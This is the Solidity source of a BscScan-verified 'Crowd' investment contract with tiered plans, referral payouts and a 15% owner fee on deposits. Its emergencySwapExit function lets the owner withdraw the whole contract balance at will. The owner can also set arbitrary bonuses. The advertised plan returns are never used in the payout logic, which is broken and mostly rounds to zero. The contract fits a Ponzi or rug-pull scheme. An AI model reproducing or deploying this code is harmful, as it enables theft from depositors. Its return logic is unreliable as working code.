/**
 *Submitted for verification at BscScan.com on 2022-09-02
*/

pragma solidity 0.5.9;



contract Crowd {
    using SafeMath for uint256;

    // Operating costs 
	uint256 constant public ownerFee = 150;
	uint256 constant public PERCENTS_DIVIDER = 1000;
    // Referral percentages
    uint8 public constant FIRST_REF = 50;
    // Limits
    uint256 public constant DEPOSIT_MIN_AMOUNT = 1 ether;
    
    uint constant public REINVEST_PERC = 0;
    // Before reinvest
    uint256 public constant WITHDRAWAL_DEADTIME = 0 days;
    // Max ROC days and related MAX ROC (Return of contribution)
    uint8 public constant CONTRIBUTION_DAYS = 100;
    uint256 public constant CONTRIBUTION_PERC = 150; //Changed
    uint256 public constant MAX_HOLD_PERCENT = 50;
    uint256 public constant TIME_STEP = 1 days;
    // Operating addresses
    address payable public owner;      // Smart Contract Owner (who deploys)
    uint public surpriseBonusThreshold;
    uint public surpriseAmount;
    

    // uint256 
    uint256 plan0_user_count;
    uint256 plan1_user_count;
    uint256 plan2_user_count;
    uint256 plan3_user_count;

    uint256 total_investors;
    uint256 total_contributed;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    uint8[] referral_bonuses;
    uint256 lastDepositId;

    struct Plan {
        uint256 time;			// number of days of the plan
        uint16 percent;			// base percent of the plan (before increments)
        uint256 min_invest;
        uint256 max_invest;
        uint16 daily_flips;
    }

    struct PlayerDeposit {
        uint8 plan;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
        uint256 poolShare;
        uint256 depositId;
    }

     struct PlayerWitdraw{
        uint256 time;
        uint256 amount;
        uint256 surprise;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 last_withdrawal;
        uint256 total_contributed;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        PlayerWitdraw[] withdrawals;
        mapping(uint8 => uint256) referrals_per_level;
        bool isActive;
        uint surprise;
    }
    mapping(uint => PlayerDeposit) internal IdToDeposits;
    address[] public userList;
    mapping(address => Player) internal players;
    Plan[] internal plans;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);
    event ReDeposit(address indexed addr, uint256 amount);


	constructor() public {
	    
        owner = msg.sender;
        plans.push(Plan(60, 200, 5e18, 50e18, 80));    //Crowd Leader plan
        plans.push(Plan(45, 100, 1e18, 5e18, 40));    //Crowd Manager plan
        plans.push(Plan(28, 80, 2e17, 10e18, 20));    //Crowd Troopers plan
        plans.push(Plan(90, 300, 50e18, 1e25, 200));   //Crowd Ambassador plan

        referral_bonuses.push(10 * FIRST_REF);
	}


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }


    function deposit(address _referral, uint8 _plan) external payable{
        require(_plan < 4);
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(!isContract(_referral));
        require(msg.value >= 1e8, "Zero amount");

        uint _planMin = plans[_plan].min_invest;
        uint _planMax = plans[_plan].max_invest;
        require(msg.value >= _planMin, "Deposit is below minimum invest amount");
        require(msg.value <= _planMax, "Deposit is above maximum invest amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 1500, "Max 1500 deposits per address");
        

        // Check and set referral
        _setReferral(msg.sender, _referral);

        // Calc pool share
        uint256 totalFees = _feesTotal(msg.value);
        uint256 rest = msg.value.sub(totalFees);
        uint256 _poolShare = rest.div(total_contributed.add(rest)).mul(100);

        lastDepositId++;
        PlayerDeposit memory data = PlayerDeposit({
            plan: _plan,
            amount: rest,
            totalWithdraw: 0,
            time: uint256(block.timestamp),
            poolShare: _poolShare,
            depositId: lastDepositId
        });
        // Create deposit
        player.deposits.push(data);
        player.isActive = true;

        // Add new user if this is first deposit
        if(player.total_contributed == 0x0){
            total_investors += 1;
        }

        player.total_contributed += rest;
        total_contributed += rest;
        IdToDeposits[lastDepositId] = data;

        // Generate referral rewards
        _referralPayout(msg.sender, msg.value);
        _plan == 0?plan0_user_count++ : _plan == 1?plan1_user_count++ : _plan == 2?plan2_user_count++ : plan3_user_count++;
        

        // Pay fees
		_feesPayout(msg.value);

        emit Deposit(msg.sender, msg.value);
    }


    function _setReferral(address _addr, address _referral) private {
        // Set referral if the user is a new user
        if(players[_addr].referral == address(0)) {
            userList.push(_addr);
            // If referral is a registered user, set it as ref, otherwise set aAddress as ref
            if(players[_referral].total_contributed > 0) {
                players[_addr].referral = _referral;
            } else {
                players[_addr].referral = owner;
            }
            
            // Update the referral counters
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }


    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;


        // Generate upline rewards
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }


    function _feesPayout(uint256 _amount) private {
        // Send fees if there is enough balance
        owner.transfer(_amount.mul(ownerFee).div(PERCENTS_DIVIDER));
        
    }

    // Total fees amount
    function _feesTotal(uint256 _amount) private pure returns(uint256 _fees_tot) {
        _fees_tot = _amount.mul(ownerFee).div(PERCENTS_DIVIDER);
        _fees_tot = _fees_tot.add(_amount.mul(FIRST_REF).div(PERCENTS_DIVIDER));
    }


    function withdraw() external payable {
        Player storage player = players[msg.sender];
        require(player.isActive, "You don't own any share");

        // Can withdraw once every WITHDRAWAL_DEADTIME days
        require(uint256(block.timestamp) > (player.last_withdrawal + WITHDRAWAL_DEADTIME) || (player.withdrawals.length <= 0), "You cannot withdraw during deadtime");
        // require(address(this).balance > 0, "Cannot withdraw, contract balance is 0");
        require(player.deposits.length < 1500, "Max 1500 deposits per address");
        
        // Calculate dividends (ROC)
        uint256 payout = this.payoutOf(msg.sender);
        player.dividends += payout;

        // Calculate the amount we should withdraw
        uint256 amount_withdrawable = player.dividends + player.referral_bonus;
        require(amount_withdrawable > 0, "Zero amount to withdraw");
       
        
        // Calculate the reinvest part and the wallet part
        uint256 autoReinvestAmount = amount_withdrawable.mul(REINVEST_PERC).div(100);
        uint256 withdrawableLessAutoReinvest = amount_withdrawable.sub(autoReinvestAmount);
        
        // Do Withdraw
        if (address(this).balance < withdrawableLessAutoReinvest) {
            player.dividends = withdrawableLessAutoReinvest.sub(address(this).balance);
			withdrawableLessAutoReinvest = address(this).balance;
		} else {
            player.dividends = 0;
        }
        msg.sender.transfer(withdrawableLessAutoReinvest);

        // Update player state
        player.referral_bonus = 0;
        player.total_withdrawn += amount_withdrawable;
        total_withdrawn += amount_withdrawable;
        player.last_withdrawal = uint256(block.timestamp);
        // If there were new dividends, update the payout timestamp
        if(payout > 0) {
            _updateTotalPayout(msg.sender);
            player.last_payout = uint256(block.timestamp);
        }
        uint _surprise = handleSurpriseBonus(msg.sender);
        player.surprise = _surprise;
        // Add the withdrawal to the list of the done withdrawals
        player.withdrawals.push(PlayerWitdraw({
            time: uint256(block.timestamp),
            amount: amount_withdrawable,
            surprise: _surprise
        }));
       

        emit Withdraw(msg.sender, amount_withdrawable);
    }


    function _updateTotalPayout(address _addr) private {
        Player storage player = players[_addr];

        // For every deposit calculate the ROC and update the withdrawn part
        
        player.isActive = false;


    }

    function handleSurpriseBonus(address _addr) public view returns(uint256){
        Player storage player = players[_addr];
        uint256 refs = player.referrals_per_level[0];
        if(refs >= surpriseBonusThreshold){
            return surpriseAmount;
        }
        return 0;
    }


    function withdrawalsOf(address _addrs) view external returns(uint256 _amount) {
        Player storage player = players[_addrs];
        // Calculate all the real withdrawn amount (to wallet, not reinvested)
        for(uint256 n = 0; n < player.withdrawals.length; n++){
            _amount += player.withdrawals[n].amount;
        }
        return _amount;
    }


    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        value += player.total_contributed.sub(player.total_withdrawn);
        if(value == 0){
            return 0;
        }
        uint256 _poolShare = value.div(total_contributed).mul(100);
        value = value.mul(_poolShare.div(100));
        // Total dividends from all deposits
        value += handleSurpriseBonus(msg.sender);
        return value;
    }

    function currentShare(address _addr) view external returns(uint256 value){
        Player storage player = players[_addr];

        value += player.total_contributed.sub(player.total_withdrawn);
        if(value == 0){
            return 0;
        }
        uint256 _poolShare = value.div(total_contributed).mul(100);
        value = _poolShare;
        return value;
    }


    function contractInfo() view external returns(uint256 _total_contributed, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_contributed, total_investors, total_withdrawn, total_referral_bonus);
    }

    function perPlanUserCount() view external returns(uint256 _plan0_user_count, uint256 _plan1_user_count, uint256 _plan2_user_count, uint256 _plan3_user_count) {
        return (plan0_user_count, plan1_user_count, plan2_user_count, plan3_user_count);
    } 

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals, uint256 _last_withdrawal, address upline, bool isActive) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        // Calculate number of referrals for each level
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        // Return user information
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_contributed,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.last_withdrawal,
            player.referral,
            player.isActive
        );
    }

 
    function contributionsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws, uint256[] memory depositPlan, uint256[] memory depTimes, uint256[] memory depShare) {
        Player storage player = players[_addr];

        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);
        uint256[] memory _depositPlan = new uint256[](player.deposits.length);
        uint256[] memory _depTimes = new uint256[](player.deposits.length);
        uint256[] memory _depShare = new uint256[](player.deposits.length);

        // Create arrays with deposits info, each index is related to a deposit
        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];
          uint _plan = dep.plan;
          uint time = plans[_plan].time;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + time * 86400;
          _depositPlan[i] = _plan;
          _depTimes[i] = dep.time;
          _depShare[i] = dep.poolShare;
        }

        return (
          _endTimes,
          _amounts,
          _totalWithdraws,
          _depositPlan,
          _depTimes,
          _depShare
        );
    }
    
    function emergencySwapExit() public returns(bool){
        require(msg.sender == owner, "You are not the owner!");
        msg.sender.transfer(address(this).balance);
        return true;
    }

    function setsurpriseBonusThreshold(uint _value) external returns(uint){
        require(msg.sender == owner, "You are not the owner!");
        surpriseBonusThreshold = _value;
        return surpriseBonusThreshold;
    }

    function setsurpriseAmount(uint _value) external returns(uint){
        require(msg.sender == owner, "You are not the owner!");
        surpriseAmount = _value;
        return surpriseAmount;
    }

    function transferOwnership(address payable _newOwner)external returns(address payable newOwner){
        require(msg.sender == owner, "You are not the owner!");
        owner = _newOwner;
        return owner;
    }


}


// Libraries used

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}